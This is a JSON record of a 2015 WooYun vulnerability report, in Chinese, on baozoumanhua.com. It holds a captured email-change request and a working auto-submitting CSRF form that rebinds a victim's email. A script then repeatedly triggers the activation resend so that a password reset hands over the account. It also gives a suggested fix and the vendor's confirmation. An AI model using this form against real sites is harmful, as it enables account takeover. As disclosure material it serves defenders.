{"id": 38997, "wybug_id": "wooyun-2015-095014", "wybug_title": "暴走漫画#Csrf防御不当可利用此漏洞修改他人绑定邮箱从而重置密码", "wybug_corp": "baozoumanhua.com", "wybug_author": "浅蓝", "wybug_date": "2015-02-02 14:15", "wybug_open_date": "2015-03-19 14:16", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["绕过"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-19：\t细节向公众公开  简要描述： 一起来守护暴漫的菊花 详细说明：  \n\n首先在验证邮箱的地方 修改一下邮箱并且抓包。   此时我的邮箱是乱填的提交地址：http://baozoumanhua.com/users/8311358提交数据：-----------------------------195704664324Content-Disposition: form-data; name=\"utf8\"â-----------------------------195704664324Content-Disposition: form-data; name=\"_method\"put-----------------------------195704664324Content-Disposition: form-data; name=\"authenticity_token\"FI+dAl32T5Oh1W5G0LQ4ArOK1t9JQRqoNOLWHaTHEgk=-----------------------------195704664324Content-Disposition: form-data; name=\"user[email]\"aaaxasa1@qq.com-----------------------------195704664324Content-Disposition: form-data; name=\"commit\"ä¿®æ¹é®ç®±这是有token的接着我写一个表单\n<form id=\"csrf\"  action=\"http://baozoumanhua.com/users/用户id\" method=\"post\">\t<input type=hidden name=\"utf8\" value=\"â\">\t<input type=hidden name=\"_method\" value=\"put\">\t<input type=hidden name=\"authenticity_token\" value=\"FI+dAl32T5Oh1W5G0LQ4ArOK1t9JQRqoNOLWHaTHEgk=\">\t<input type=hidden name=\"user[email]\" value=\"你的邮箱\">\t<input type=hidden name=\"commit\" value=\"ä¿®æ¹é®ç®±\">   <script>        document.getElementById('csrf').submit();    </script></form>\n再点击发送激活邮件 抓包 GET:http://baozoumanhua.com/my/resend/用户ID此时我将表单的 email 换成我的有效邮箱接着打开并且抓包\n\n 直接提示修改成功  无视token\n\n可以看到 先get访问了 a.htm  然后再post提交到 暴走漫画现在邮箱改掉了 只需要 访问http://baozoumanhua.com/my/resend/8311358 就行至于这个 做个弹窗到新窗口  弹到b.htm b.htm 用js写个每一秒GET访问一次http://baozoumanhua.com/my/resend/8311358这时我被弹到了b.htm，   被弹到b.htm后会很多次get访问http://baozoumanhua.com/my/resend/8311358  接着我就收到了激活邮件\n\n   漏洞证明：  \n\n现在被激活了 就可以去http://baozoumanhua.com/fetchpass 发送一个重置密码邮件。=。= 接着就可以改他的密码了   修复方案：  可以像上次那个漏洞一样 WooYun: 暴走漫画越权发暴漫作品(拿王尼玛帐号测试)利用打赏功能发财致富走上人生巅峰 把token带到 http头部  或者验证一下referer。   版权声明：转载请注明来源 浅蓝@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-02-03 20:51 厂商回复： 哦 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-06 01:08 |    \t\tM4ster \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:7        | www.m4ster@gmail.com)\t\t \n  无视token :-O    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}